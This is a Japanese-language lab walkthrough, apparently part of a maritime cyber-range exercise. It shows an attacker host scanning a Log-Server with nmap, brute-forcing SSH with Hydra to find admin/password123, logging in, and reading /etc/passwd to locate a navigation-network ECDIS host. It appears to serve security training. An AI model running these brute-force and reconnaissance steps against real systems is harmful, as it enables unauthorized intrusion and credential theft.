# 01. Log-Server 侵入：偵察 & ブルートフォース

**ターゲット:** `192.168.10.20` (Log-Server / Business NW)  
**攻撃元:** `192.168.5.30` (C2-Server / Crew NW)

---

## Step 1 — 偵察（ポートスキャン）

C2 Server から Log-Server の SSH ポートが開いているか確認します。

```bash
nmap -p 22 192.168.10.20
```

**期待される出力：**

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-10 06:30 +0000
Nmap scan report for 192.168.10.20
Host is up (0.00039s latency).

PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 0.61 seconds
```

> ポート 22（SSH）が `open` であることを確認。次はブルートフォースへ。

---

## Step 2 — ブルートフォース攻撃（Hydra）

C2 に用意されている `passwords.txt` を使って SSH のパスワードを割り出します。  
ユーザー名は `admin` を試みます。

```bash
hydra -l admin -P /opt/passwords.txt ssh://192.168.10.20
```

**期待される出力：**

```
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak
...
[22][ssh] host: 192.168.10.20   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found
```

> **発見した認証情報**
>
> - Host: `192.168.10.20`
> - Login: `admin`
> - Password: `password123`

---

## Step 3 — SSH ログイン & 内部調査

発見したパスワードで Log-Server に侵入します。

```bash
ssh admin@192.168.10.20
# パスワード: password123
```

ログイン後、ユーザー情報と内部ネットワークを確認します。

```bash
cat /etc/passwd
```

`/etc/passwd` から内部ホスト・ユーザー構成を把握します。  
Navi NW の ECDIS（OpenCPN）は `192.168.20.20` で稼働していることが判明します。
